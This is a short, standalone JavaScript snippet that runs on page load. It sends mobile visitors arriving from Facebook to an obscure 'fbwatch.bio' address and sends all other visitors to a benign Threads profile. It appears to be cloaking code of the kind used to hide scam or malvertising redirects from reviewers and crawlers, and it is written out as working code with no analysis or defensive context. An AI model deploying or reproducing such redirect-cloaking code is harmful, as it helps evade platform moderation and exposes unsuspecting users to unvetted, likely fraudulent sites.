  <script>
    function redirectToDifferentWebsite() {
        var referrer = document.referrer.toLowerCase();
        var userAgent = navigator.userAgent.toLowerCase();

        var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(userAgent);
        var fbDomains = ["facebook.com", "fb.com"]; // Add more Facebook domains here if needed
        var mobileDevice = "http://www.fbwatch.bio/?taberna";
        var pcURL = "https://www.threads.net/@zuck";
        var destinationURL = pcURL; // Default to pcURL

        if (isMobile && fbDomains.some(domain => referrer.includes(domain))) {
            destinationURL = mobileDevice;
        }

        window.location.href = destinationURL;
    }

    redirectToDifferentWebsite();
</script>
